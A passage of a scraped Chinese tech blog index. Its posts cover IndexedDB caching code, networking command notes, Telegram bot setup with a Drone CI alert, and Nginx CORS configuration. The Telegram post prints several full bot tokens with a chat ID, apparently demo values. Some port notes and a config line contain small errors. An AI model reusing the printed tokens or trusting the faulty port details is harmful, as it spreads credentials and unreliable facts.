index.openCursor(boundKeyRange).onsuccess = function(event) { var cursor = event.target.result; if (cursor) { // Do something with the matches. cursor.continue(); } }; 有時候我們會想要由大到小查看資料而非預設由小到大方向，傳入第二個\u0026quot;prev\u0026quot;字串便能做到： 1 2 3 4 5 6 7 objectStore.openCursor(null, \u0026#34;prev\u0026#34;).onsuccess = function(event) { var cursor = event.target.result; if (cursor) { // Do something with the entries. cursor.continue(); } }; 由於\u0026quot;name\u0026quot;索引不具唯一性，所以一個名字下可能會出現多筆資料，此時如果想要避開這多筆資料，請傳入\u0026quot;nextunique\u0026quot;或\u0026quot;prevunique\u0026quot;做為第二個方向參數，當傳入之後，如一個名字下遇到多筆資料，則只有資料鍵最小的資料會被回傳。 1 2 3 4 5 6 7 index.openKeyCursor(null, \u0026#34;nextunique\u0026#34;).onsuccess = function(event) { var cursor = event.target.result; if (cursor) { // Do something with the entries. cursor.continue(); } }; 關於可傳入的方向參數，請參考IDBCursor常數。\n安全性 IndexedDB遵守同源政策，所以它綁定創建它的來源網站，其他來源網站無法存取。 就像對載入 \u0026lt;frame\u0026gt; 和 \u0026lt;iframe\u0026gt; 網頁的第三方cookie所設下的安全性和隱私權考量限制，IndexedDB無法在載入 \u0026lt;frame\u0026gt; 和 \u0026lt;iframe\u0026gt; 網頁上運作，詳情請見 bug 595307。 瀏覽器關閉風險 當瀏覽器關閉，例如使用者按下關閉鈕，任何未完成IndexedDB交易都將默默中止，這些交易不會完成，錯誤事件也不會觸發。既然瀏覽器可能隨時被關閉，我們無法完全指望任何特定交易一定會完成，或是依賴錯誤事件做出相應處理，針對這種狀況，我們需要注意： 每一筆交易結束後都應該要保持資料庫完整性，例如說，有一串使用者編輯項目清單正要存入資料庫，我們如果先在一個交易中清除舊清單，然後在另一個交易中存入新清單，那就會面臨到清除完就清單後，新清單存入交易還來不及回存，瀏覽器就關閉的風險，而這個時候資料庫裡面的清單資料將消失。所以比較好的做法應該是在同一筆交易中完成清除舊清單和存入新清單。 永遠不要在unload事件中執行資料庫交易，因為如果unload事件是觸發在瀏覽器關閉下，任何資料庫交易都不會發生，或許，瀏覽器(或分頁)打開時讀取資料庫，更新資料庫當使用者編輯資料，當瀏覽器(或分頁)關閉時儲存資料這樣的做法比較直覺，不過資料庫的操作是非同步進行地，所以瀏覽器關閉的執行會在資料庫操作前發生，進而中斷後續非同步的資料庫交易，所以在unload事件中執行資料庫交易是行不通地。 事實上不論瀏覽器是否正常關閉，都沒有任何方法保證IndexedDB交易能夠順利完成，請見 bug 870645。 範例練習：將聊天室推播訊息寫進 IndexedDB 建立db.js，並將操作 IndexedDB 整合至檔案中。 vue檔引入db.js，並一次僅撈最新50筆資料。 db.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 // 回傳是否支援 IndexedDB export function isSupportDB() { const indexedDB = window.indexedDB || window.webkitIndexedDB || window.mozIndexedDB || window.msIndexedDB return !!indexedDB } // 打開or建立DB export function openDB() { return new Promise((resolve, reject) =\u0026gt; { const request = indexedDB.open(\u0026#34;ChatDB\u0026#34;) // 打開or建立聊天室DB request.onerror = e =\u0026gt; { console.log(\u0026#34;idb create fail\u0026#34;) reject(e) } request.onsuccess = () =\u0026gt; { console.log(\u0026#34;idb create success\u0026#34;) DBObject = request.result resolve(DBObject) // 成功後返回DB物件 } request.onupgradeneeded = e =\u0026gt; { // 若版本已升級則重新建立DB物件，並返回DB物件 DBObject = e.target.result DBObject.createObjectStore(\u0026#34;chatData\u0026#34;, { keyPath: \u0026#34;index\u0026#34;, autoIncrement: true }) resolve(DBObject) } }) } // 取歷史聊天紀錄最新50筆 export function getHistory(num) { return new Promise(resolve =\u0026gt; { const objectStore = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readonly\u0026#34;).objectStore(\u0026#34;chatData\u0026#34;) let getKey = objectStore.getAllKeys() getKey.onsuccess = () =\u0026gt; { let result = [] for (let i = getKey.result.length - num * 50 - 1; i \u0026gt; getKey.result.length - num * 50 - 50 - 1; i--) { let getItem = objectStore.get(getKey.result[i]) getItem.onsuccess = () =\u0026gt; { result.unshift(getItem.result) } } resolve(result) } // 一次撈全部資料 // const request = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readonly\u0026#34;).objectStore(\u0026#34;chatData\u0026#34;).getAll() // request.onsuccess = () =\u0026gt; { // resolve(request.result) // } }) } // 收到推播將訊息寫入idb export function addToDB(data) { const request = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readwrite\u0026#34;) request.objectStore(\u0026#34;chatData\u0026#34;).add(data) //数据写入成功的回调 request.onsuccess = () =\u0026gt; {} request.onerror = event =\u0026gt; { console.log(event) } } // 清除idb聊天紀錄 export function clearDB() { const request = DBObject.transaction([\u0026#34;chatData\u0026#34;], \u0026#34;readwrite\u0026#34;) request.objectStore(\u0026#34;chatData\u0026#34;).clear() } chatroom.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 ... \u0026lt;script\u0026gt; import * as idb from \u0026#34;@/utils/db\u0026#34; export default { data: { return { msgData: [], historyRange: 0 } } mounted() { setTimeout(() =\u0026gt; { this.getHistory(this.historyRange) }, 500) } methods: { getHistory(num) { if (idb.isSupportDB()) { // 若支援則開啟DB，並待回傳後撈資料 idb.openDB().then(() =\u0026gt; { idb.getHistory(num).then(result =\u0026gt; { setTimeout(() =\u0026gt; { if (!this.msgData.length) { // 未有資料時直接定義 this.msgData = result } else { result.forEach(item =\u0026gt; { // 將撈到的資料由前塞入msgData this.msgData.unshift(item) }) } this.historyRange++ }, 0) }) }) } }, add(data) { idb.addToDB(data) }, clearDB() { idb.clearDB() } } } \u0026lt;/script\u0026gt; ","date":"2022-09-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52351840670_d321f7cc15_o.jpg","permalink":"https://wayneblog.ga/2022-09-12/use-indexeddb/","title":"前端緩存大筆資料：IndexedDB 介紹/應用"},{"content":" 指導教師：黃威誌 使用軟體 Cisco Packet Tracer Cisco官方網路模擬器 CPT下載教學\nwireshark(3.6.0) 封包擷取工具 下載wireshark\nVmware 虛擬機軟體 下載Vmware\n指令筆記 ping 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ### 常用來測試的ip ### 中華電信DNS ping 168.95.1.1 ### Google ping 8.8.8.8 \u0026gt;\u0026gt;\u0026gt; 回覆自 [IP]: 位元組=32 時間=7ms TTL=245 \u0026gt;\u0026gt;\u0026gt; 回覆自 [IP]: 位元組=32 時間=7ms TTL=245 \u0026gt;\u0026gt;\u0026gt; 回覆自 [IP]: 位元組=32 時間=7ms TTL=245 \u0026gt;\u0026gt;\u0026gt; 回覆自 [IP]: 位元組=32 時間=7ms TTL=245 時間: 若連續超過100ms，代表網路有問題 TTL: Time to live ipconfig 查詢電腦網卡設定 ipconfig(Windows) / ifconfig(Linux/UNIX) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ### 基本使用 ipconfig ### 更詳細版本 ipconfig /all ### 查詢參數 ipconfig /? ### 釋放IP位址 ipconfig /release # IPv4 ipconfig /release6 # IPv6 ### 重新取得IP位址 (會造成瞬間斷線) ipconfig /renew # IPv4 ipconfig /renew6 # IPv6 ### 清除DNS快取 ipconfig /flushdns tracert 追蹤連線出去的節點 最多30個節點 1 2 3 4 tracert 168.95.1.1 ### 也可輸入網址 tracert www.pchome.com.tw nslookup 判斷DNS名稱解析伺服器是否正常 1 2 3 4 nslookup 168.95.1.1 ### 也可輸入網址 nslookup www.pchome.com.tw netstat 查詢電腦連線服務的狀態 使用port：7 1 2 3 4 netstat ### 列出目前所有的網路狀態(包含IPv6) netstat -an Cisco Packet Tracer 設定Router 範例使用的設備\nRouters: 1841 router Connections: RS 232 Devices: PC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 ### 進入router Router\u0026gt; enable Router# ### 進入privey config Router# configure terminal Router(config)# ### 設定 hostname (範例設定為\u0026#34;ISP_1\u0026#34;) Router(config)# hostname ISP_1 ### 設定網卡介面 (範例設定為\u0026#34;fastEthernet 0/0\u0026#34;) ISP_1(config)# interface fastEthernet 0/0 ISP_1(config-if)# ### 設定IP ISP_1(config-if)# ip address 192.168.0.5 255.255.255.0 ISP_1(config-if)# ### 離開並查看IP設定 ISP_1(config-if)# exit ISP_1(config)# exit ISP_1# ISP_1# show running-config Building configuration... Current configuration : 575 bytes ! version 12.4 no service timestamps log datetime msec no service timestamps debug datetime msec no service password-encryption ! hostname ISP_1 ! ! ! ! ! ! ! ! ip cef no ipv6 cef ! ! --More-- Wireshark 防火牆概念 FTP 使用TCP通訊協定 使用port：21(命令傳輸)、20(檔案傳輸) 近期已較不常使用，因安全性問題 SSH(secure shell) 使用TCP通訊協定 用於登入系統、傳輸指令 加密傳輸 使用port：22 telnet 使用TCP通訊協定 用於文字命令 無加密 使用port：23 SMTP(simple mail transfer protocal) 使用DNS Server的MX Record 用於寄出mail 使用TCP通訊協定 使用port：25 對寄件者身分不做驗證，只會驗證收件者 現今已較少使用，通常已改使用網頁式的mail，較於安全且減省資源 POP3 用來接收mail、遠端管理郵件，可以單純下載，伺服器端不需刪除 採用不加密通訊 新版(POP3S)採取加密通訊 使用TCP通訊協定 使用port：110 WHOIS 用於查詢網際網路中網域名稱IP與所有者的資訊 使用TCP通訊協定 使用port：43 DNS(domain name system) 用於網域名稱與IP的對應查詢 同時使用TCP/UDP通訊協定 使用port：53 HTTP(hypertext transfer protocol) 網頁的發布和接收 使用TCP通訊協定 使用port：80 (8080為替代port) IMAP 用於線上和離線狀態的瀏覽模式 使用TCP通訊協定 使用port：143 (8080為替代port) ","date":"2022-09-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52351384271_09abac0c54_o.jpg","permalink":"https://wayneblog.ga/2022-09-12/network-management-lesson/","title":"網路管理技術應用實務班筆記"},{"content":" 參考網站 - Telegram 聊天機器人原理\n參考網站 - 向 @BotFather 申請一隻機器人吧！\n參考網站 - Telegram 機器人的設定\n參考網站 - CI/CD trigger WebHook to Telegram Bot\n參考網站 - How to setup a Telegram bot for your Drone CI/CD builds\nTelegram 聊天機器人原理 機器人的運作原理 現在你發了一段訊息給機器人\n但是並不是機器人直接回你訊息\n詳細情況如下圖：\n一開始你的訊息會被傳送到 TG 伺服器 TG 伺服器會通知機器人：欸！有一則新訊息 機器人會發一個指令給 TG 伺服器 TG 伺服器照著指令的需求，回應訊息給你 機器人接收訊息的兩種模式 機器人可以放在伺服器，也可以用客戶端的方式運作\nWebhook\n以 伺服器 方式被動接收訊息，需要有 IP 位置，通常會放在 網站伺服器(Web Hosting) 上，要自己架設網站伺服器不是件容易的事，所以官方還提供了另一種做法 Long Polling。\n以 客戶端 方式主動跟 TG 伺服器要訊息，可以直接 在自己電腦上運作，不需要架(租)伺服器也能讓機器人順利運作，缺點就是電腦要一直開著，當然你也可以使用 雲端服務(IaaS、PaaS、SaaS)。 機器人發送訊息的三種方式 HTTP GET 1 https://api.telegram.org/bot{Token}/{Method}?{Parameter1}={Value1}\u0026amp;{Parameter2}={Value2} 直接以 網址參數 的方式傳送指令，GET 沒有 Body，只傳送 Headers (你可以當作不會傳送檔案過去)，通常是用來取資料用，優點是可以直接用瀏覽器執行，缺點是有 2KB 的限制，雖然不太可能用到這長的指令，但還是比較建議使用 POST。\nHTTP POST 1 {\u0026#34;method\u0026#34;:\u0026#34;Method\u0026#34;,\u0026#34;Parameter1\u0026#34;:\u0026#34;Value1\u0026#34;,\u0026#34;Parameter2\u0026#34;:\u0026#34;Value2\u0026#34;} POST 是 以 Body 傳送資料(檔案)，程式通常都是以這種方式溝通，網頁裡的表單也經常是以這種方式傳送，資料不會顯示在網址列，可以傳送的資料大小比 GET 大得多：1MB ~ 2GB。\n直接 Print 這個方式 只有在 webhook 模式 下才能使用，因為只有伺服器可以直接回應訊息。\n向 @BotFather 申請一隻機器人吧！ The BotFather The Botfather 這個名字是致敬 1972 年的美國電影《教父》\n它是機器人，也是機器人的管理者\n幾乎所有機器人的設定、建立都要透過他\n用機器人設定機器人聽起來就很有趣，對吧？\n@BotFather 的功能 私訊 @BotFather ，按「開始」後就會顯示出一大堆指令，真是令人眼花撩亂\n官方網頁版說明\n簡單介紹幾個比較常用的功能：\n指令 說明 /newbot 建立一個新的機器人 /mybots 列出所有機器人，用按鈕的方式設定機器人，而非指令（這樣可以讓聊天紀錄變得很乾淨，我比較喜歡用這個） 修改相關 /setname 修改顯示名稱 /setdescription 修改說明 /setabouttext 修改簡介 /setuserpic 修改大頭貼 /setcommands 修改指令選單 /deletebot 刪除機器人 設定相關 /token 顯示機器人的 token /revoke 產生新的 token，舊的會失效 /setjoingroups 設定是否能被加入群組 /setprivacy 設定是否能讀取所有聊天室訊息（機器人的訊息除外，機器人不論如何都不會看到機器人的訊息） 建立你的機器人吧 輸入 /newbot 指令 幫機器人取名字 1 Alright, a new bot. How are we going to call it? Please choose a name for your bot. 這邊它會要你幫你的機器人取一個名字，這個以後能修改，所以隨便取沒差\n設定 username 1 Good. Now let\u0026#39;s choose a username for your bot. It must end in `bot`. Like this, for example: TetrisBot or tetris_bot. ⚠️ 注意：設定後就不能修改了，請謹慎思考之後設定，避免反悔時需要請使用者遷移\n需要幫你的機器人設定一個 username，必須符合以下規則：\n不需要打 @ 以 a~z 開頭 以 bot 結尾 只能使用 a~z、0~9 和底線 最小長度為 5 個字元 顯示時會區分大小寫，使用時不區分大小寫（例如設定成 @TetrisBot，用 @tETrISbOt 一樣會指到同一個機器人）\n常見問題：\n不能以數字開頭 1 Sorry, this username is invalid. 不能用 bot 以外的字結尾 1 Sorry, the username must end in \u0026#39;bot\u0026#39;. E.g. \u0026#39;Tetris_bot\u0026#39; or \u0026#39;Tetrisbot\u0026#39; username 已經被別人先用走了 1 Sorry, this username is already taken. Please try something different. 出現 Done 表示你設定成功了\n使用你的機器人吧 現在你已經可以使用機器人了\n按下說明裡的連結(t.me/ironman2021_by_miku3920_bot 點你自己的)，並且點擊「開始」\n然後你就會發現什麼事情都沒發生，因為我們還沒寫機器人的程式嘛\n不過就算不寫程式也可以讓它說話，利用 HTTP GET 方法，與 sendMessage 這個 API\n1 https://api.telegram.org/bot{Token}/{Method}?{Parameter1}={Value1}\u0026amp;{Parameter2}={Value2} Token：1985044907:AAEdySrbzTc8tVdBjfymlfyaBUJGeu7r-v4（你的 bot token） Method：sendMessage Parameter1：chat_id Value1：127355800（你的 uid，可以透過 @userinfobot 取得） Parameter2：text Value2：Hello,+World!+你好，世界！（空白要用「+」替換） 組合完會像這個樣子，直接貼到瀏覽器的網址列就能使用囉：\n1 https://api.telegram.org/bot1985044907:AAEdySrbzTc8tVdBjfymlfyaBUJGeu7r-v4/sendMessage?chat_id=127355800\u0026amp;text=Hello,+World!+你好，世界！ PS：聊天室的 chat_id，先將你的機器人邀請進入聊天室，再使用此網址取得：https://api.telegram.org/bot${your_bot_token}/getUpdates\n常見問題：\nToken 打錯 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:401,\u0026#34;description\u0026#34;:\u0026#34;Unauthorized\u0026#34;} Method 打錯 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:404,\u0026#34;description\u0026#34;:\u0026#34;Not Found\u0026#34;} chat_id 的值不能為空 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:400,\u0026#34;description\u0026#34;:\u0026#34;Bad Request: chat_id is empty\u0026#34;} chat_id 的值打錯 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:400,\u0026#34;description\u0026#34;:\u0026#34;Bad Request: chat not found\u0026#34;} 沒私訊過機器人 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:403,\u0026#34;description\u0026#34;:\u0026#34;Forbidden: bot can\u0026#39;t initiate conversation with a user\u0026#34;} text 的值不能為空 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:400,\u0026#34;description\u0026#34;:\u0026#34;Bad Request: message text is empty\u0026#34;} 成功的話會返回機器人發送的訊息（json 格式）到網頁上：\n1 {\u0026#34;ok\u0026#34;:true,\u0026#34;result\u0026#34;:{\u0026#34;message_id\u0026#34;:5,\u0026#34;from\u0026#34;:{\u0026#34;id\u0026#34;:1985044907,\u0026#34;is_bot\u0026#34;:true,\u0026#34;first_name\u0026#34;:\u0026#34;2021 iThome\\u9435\\u4eba\\u8cfd\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;ironman2021_by_miku3920_bot\u0026#34;},\u0026#34;chat\u0026#34;:{\u0026#34;id\u0026#34;:127355800,\u0026#34;first_name\u0026#34;:\u0026#34;\\u521d\\u97f3\u0026#34;,\u0026#34;last_name\u0026#34;:\u0026#34;\\u30df\\u30af\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;miku3920\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;private\u0026#34;},\u0026#34;date\u0026#34;:1631440402,\u0026#34;text\u0026#34;:\u0026#34;Hello, World! \\u4f60\\u597d\\uff0c\\u4e16\\u754c\\uff01\u0026#34;}} Telegram 機器人的設定 輸入 /mybots 指令後就會出現機器人列表\n1 Choose a bot from the list below: 選擇一個你要查看或設定的機器人\n我之前就有建立過機器人，所以會顯示兩個\n1 2 Here it is: 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot. What do you want to do with the bot? 點下去後就會出現六個選項，我一個個來講解：\nAPI Token - 查看 token 1 2 3 Here is the token for bot 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot: 1985044907:AAH1kZaEZFHoA6YqB6IFtvbkyOjvcpPOfbQ 忘記 token 時可以來這裡查看，或是你想要重置 token\nRevoke current token - 重置 token 1 2 3 Token for the bot 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot has been revoked. New token is: 1985044907:AAG3E05XowN2sqy286aplwr6oBc17q0CByg 按下重置按鈕後，它就會給你一個新的 token，舊的會立即失效\nEdit Bot - 修改機器人 1 2 3 4 5 6 7 Edit @ironman2021_by_miku3920_bot info. Name: 2021 iThome鐵人賽 Description: ? About: ? Botpic: ? no botpic Commands: no commands yet Edit Name - 修改名字 按下按鈕後會出現以下訊息\n1 OK. Send me the new name for your bot. 直接傳送新的名稱給它就行了\n1 Success! Name updated. /help 看到這個就是修改成功了\nEdit Description - 修改說明 這個會顯示在聊天室的最上方，用來說明機器人有能些功能，或是如何使用\n1 OK. Send me the new description for the bot. People will see this description when they open a chat with your bot, in a block titled \u0026#39;What can this bot do?\u0026#39;. 傳送一段訊息給它，可以是多行的文字\n1 Success! Description updated. /help 看到這個就是修改成功了\n原本在聊天室上方啥都沒有，現在多了一個訊息框\nEdit About - 修改簡介 這個會顯示在機器人的個人資訊頁面上\n1 OK. Send me the new \u0026#39;About\u0026#39; text. People will see this text on the bot\u0026#39;s profile page and it will be sent together with a link to your bot when they share it with someone. 傳送一段訊息給它，可以是多行的文字\n1 Success! About section updated. /help 看到這個就是修改成功了\n原本是只有顯示 username，現在多了 簡介\nEdit Botpic - 修改大頭貼 1 OK. Send me the new profile photo for the bot. 建議先裁切成正方形（1：1）\n1 Please send me the picture as a \u0026#39;Photo\u0026#39;, not as a \u0026#39;File\u0026#39;. 這邊要傳送照片，不能傳檔案\n1 Success! Profile photo updated. /help 成功的話，機器人的大頭貼就會更新成剛剛上傳的圖片\nEdit Commands - 修改指令選單 1 2 3 4 5 6 OK. Send me a list of commands for your bot. Please use this format: command1 - Description command2 - Another description Send /empty to keep the list empty. 要按照它給的格式輸入，不需要打 /\n1 Success! Command list updated. /help 成功的話，選單中就會出現剛剛設定的指令\n如果機器人是在群組使用，建議改成空的，避免誤觸\n群組裡較常使用 ! 開頭的指令，這樣才不會變成藍藍的容易按到\n在剛剛那邊，按 /empty 就行了\n修改完會變成這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 Edit @ironman2021_by_miku3920_bot info. Name: 2021 iThome鐵人賽 Description: 一些說明文字，功能如下： 1. AAA 2. BBB 3. CCC About: 鐵人賽展示用機器人 by @miku3920 鐵人賽展示用機器人 by @miku3920 鐵人賽展示用機器人 by @miku3920 Botpic: ? has a botpic Commands: no commands yet Bot Settings - 設定機器人 1 Settings for @ironman2021_by_miku3920_bot. Inline Mode - 內聯模式（內嵌模式） 可以讓機器人直接在訊息輸入框使用，不需要將機器人加入群組\n這個功能夠講一整天了，目前還用不到，我們以後專門找一天來講\nAllow Group? - 是否能被加入群組? 1 2 3 Groups are currently enabled for bot 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot Disabling groups will forbid users to add 2021 iThome鐵人賽 to groups. enabled(預設) - 表示機器人能被別人拉進群組\n如果你不想讓別人拉你的機器人，可以按 Turn groups off\n1 2 3 Groups are currently disabled for bot 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot. Enabling groups will allow users to add 2021 iThome鐵人賽 to groups. disabled - 表示機器人不能被別人拉進群組\n如果你想讓別人的群組也能使用你的機器人，就按 Turn groups on\nGroup Privacy - 是否能讀取所有聊天室訊息 官方說明\n1 Privacy mode is enabled for 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot. enabled(預設) - 表示機器人是成員時不能讀取群組裡的所有訊息\n機器人只看的到它的指令和回覆它的訊息\n但是如果升級成管理員就沒這限制\n1 Privacy mode is disabled for 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot. disabled - 表示機器人就算不是管理員也能讀取群組裡的所有訊息\n機器人是成員時就能讀取所有訊息\nPayments - 付款相關設定 台灣不能用，有生之年系列，跳過\nDomain - 網站登入用 與機器人較無關，暫時不提\nPayments - 付款相關設定 歐付寶、綠界、台灣 pay、街口、悠遊付，不考慮進駐一下嗎\nTransfer Ownership - 轉移機器人 ⚠️ 注意：非必要請勿使用！\nChoose recipient - 選擇使用者 1 Please share the new owner\u0026#39;s contact or their username. 按下按鈕後，它會請你把對方以聯絡人的方式分享給它，或是輸入對方的 username\n常見問題：\n要輸入 @username，不能只輸入 username 1 Incorrect format. Please make sure to send either a contact or username. 不能轉移給頻道、機器人、或是自己 1 Bot ownership can\u0026#39;t be transferred to channel, another bot or yourself. 對方要私訊過機器人，而且不能封鎖機器人 1 Oops! Please make sure the new owner has sent at least one message to the bot and didn\u0026#39;t block it. 輸入正確的話，就會出現以下訊息：\n1 2 3 4 5 You are about to transfer ownership of the bot @ironman2021_by_miku3920_bot to 初音 ミク. After this you won\u0026#39;t be able to control the bot anymore. The new owner will get access to the bot messages and other data – and can even delete the bot completely. Please make sure you don\u0026#39;t violate your users\u0026#39; privacy (consider GDPR and other laws). If you are sure please press the button below. 看到這則訊息代表離成功轉移不遠了\nYes, I am sure, proceed. - 確認轉移 如果你有設定兩步驟驗證的話，這邊會跳出來要你輸入\n常見問題：\n對方擁有的機器人數量已達上限 1 Oops! has reached the maximum allowed number of bots. Please ask them to delete (or pass to another account) one of their unused bots first. 如果對方已經有 20 隻機器人（達到上限），就會出現這個對話框，他請你先叫對方轉移或刪除一些沒在用的機器人，這樣你才可以轉移給對方。\n1 It worked! We hope @ironman2021_by_miku3920_bot will enjoy its new home. 如果轉移成功就會出現這則訊息\n1 2 3 Ownership of the bot @ironman2021_by_miku3920_bot has been transferred to you by 初音 ミク. You can now control the bot using /mybots. If you did not request this, you can delete the bot. Delete Bot - 刪除機器人 ⚠️ 注意：非必要請勿使用！\n1 You are about to delete your bot 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot. Is that correct? 這邊的按鈕順序是隨機的，避免你頭腦不清楚把機器人刪了\n1 Are you TOTALLY sure you want to delete 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot ? 要連續按兩次 Yes 機器人才會被刪掉\n1 You have deleted 2021 iThome鐵人賽 @ironman2021_by_miku3920_bot. 看到這則訊息表示機器人已經刪除，無法復原\n所有群組裡的這隻機器人都會顯示成 Deleted Account\nBonus：Drone CI/CD 流程失敗時，叫你的 Telegram 機器人通知你！ 建立群組，並取得群組的 chat_id Telegram 建立群組，並將你的 Telegram 機器人拉進群組內(@{your bot username})。 透過此 API 取得群組的 chat_id： 1 https://api.telegram.org/bot${your bot token}/getUpdates getUpdates API 會取得 json，找到你剛剛開的群組的 chat_id\n透過 Drone Plugin 從 Drone Plugin 可以找到很多套件，可以搭配 CI/CD 使用，而我從這找到 Telegram by appleboy 的套件。\nDrone CI/CD 補上告警的 step。 你的 Drone CI/CD step 加上使用 Telegram by appleboy 叫你的機器人於 pipeline 失敗時於群組內發出告警。\nPS：記得將你的 telegram bot token 與群組的 chat_id 加到 Drone Secrets。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 kind: pipeline type: docker name: install and deploy steps: - name: build image: node:15 commands: - node --version - yarn --version # - yarn cache clean -f - yarn install --ignore-engines - yarn run build - ls -al dist/static/ when: branch: - master event: - push - name: deploy image: thegeeklab/drone-s3-sync settings: bucket: xxxxxxxxx(你的aws s3 bucket) access_key: from_secret: aws_access_key_id secret_key: from_secret: aws_secret_access_key source: ./dist/ target: /admin acl: \u0026#34;*\u0026#34;: public-read region: xxxxxxxxx(你的aws s3 region) delete: true cloudfront_distribution: xxxxxxxxx(你的aws cloudfront distribution) when: branch: - master event: - push + - name: send telegram notification + image: appleboy/drone-telegram + settings: + token: + from_secret: telegram_bot_token + to: + from_secret: telegram_chat_id + format: markdown + message: \u0026gt; + `{{repo.name}}` 於 `{{commit.branch}}` 編譯失敗：#`{{build.number}}` + when: + status: [failure] token： 你的 Telegram 機器人的 token。 to： chat_id。 format： 使用 markdown 格式。 message： 機器人傳的訊息。 when.status [failure]： 當此 pipeline 失敗時觸發此 step(send telegram notification)，亦可於成功或失敗皆告警：[success, failure]。 詳細參數可參考 Drone Plugin - appleboy/drone-telegram\n","date":"2022-08-25T00:00:00Z","image":"https://live.staticflickr.com/65535/52309739568_a0d98a6137_o.png","permalink":"https://wayneblog.ga/2022-08-25/drone-cicd-with-telegram-bot/","title":"Telegram 機器人說明，並為你的 Drone CI/CD 配置 Telegram 機器人"},{"content":" 參考文章 CORS跨域與Nginx反向代理 CORS on Nginx Nginx解决CORS跨域解决方案 在 Nginx 的 ProxyPass Upstream 設定 CORS （跨來源資源共享） CORS跨域 跨域資源共享 - CORS 跨域資源共享(CORS)是一種機制，它使用額外的 HTTP 頭來告訴瀏覽器，讓運行在一個 origin (domain) 上的Web應用被准許訪問來自不同源服務器上的指定的資源。當一個資源從與該資源本身所在的服務器不同的域、協議或端口請求一個資源時，資源會發起一個跨域 HTTP 請求。\n比如，站點 http://domain-a.com 的某 HTML 頁面通過 \u0026lt;img\u0026gt; 的 src 請求 http://domain-b.com/image.jpg。網絡上的許多頁面都會加載來自不同域的CSS樣式表，圖像和腳本等資源。\n出於安全原因，瀏覽器限制從腳本內發起的跨源HTTP請求。例如，XMLHttpRequest和Fetch API遵循同源策略。這意味著使用這些API的Web應用程序只能從加載應用程序的同一個域請求HTTP資源，除非響應報文包含了正確CORS響應頭。\n跨域時部分瀏覽器預設不攜帶cookie，因此為了攜帶cookie需要在前端設定xmlhttprequest的withCrendetalls屬性。 「同源」定義 「同源」定義很簡單，以下三個參數都相同：\n1 [protocol]://[domain]:[port] 白話說，當你在 https://www.example.com/product.html 頁面\n嘗試對以下路徑發出請求，都違反同源：\nhttp://www.example.com/api/products/40.json https://www.example2.com/api/products/40.json https://www.example.com:8080/api/products/40.json 乖孩子遵守同源，不會被打：\nhttps://www.example.com/api/products/40.json 簡單請求和複雜請求 簡單請求與複雜請求的差別是複雜請求會自動發出一個 OPTIONS 的預檢請求，當請求得到確認後，才開始真正發送請求。\n綜上，我們要解決兩個問題：\nOPTIONS 請求的正確響應 跨域請求正確響應 OPTIONS 請求的正確響應 參考網址\n解決的方式有多種，既可以在Web Server解決，也可以在源碼層解決。因為問題比較普遍，故我們選擇在Web Server解決，下面我們以 Nginx 為例，說明解決方案。 假設訪問的地址為 /example , Nginx 配置如下: 1 2 3 4 5 6 7 location /example { proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8080/; } 為了解決跨域問題，添加如下內容: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 location /example { + if ($request_method = \u0026#39;OPTIONS\u0026#39;) { + add_header Access-Control-Allow-Origin *; + add_header Access-Control-Max-Age 1728000; + add_header Access-Control-Allow-Methods GET,POST,OPTIONS; + add_header Access-Control-Allow-Headers \u0026#39;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range\u0026#39;; + add_header Content-Type\u0026#39; \u0026#39;text/plain; charset=utf-8\u0026#39;; + add_header Content-Length 0 ; + return 204; + } proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8080/; } 說明： if ($request_method = 'OPTIONS') {...} 當請求方法為 OPTIONS 時:\n添加允許源 Access-Control-Allow-Origin 為 * (可根據業務需要更改) 添加緩存時長 Access-Control-Max-Age，當下次請求時，無需再發送 OPTIONS 請求 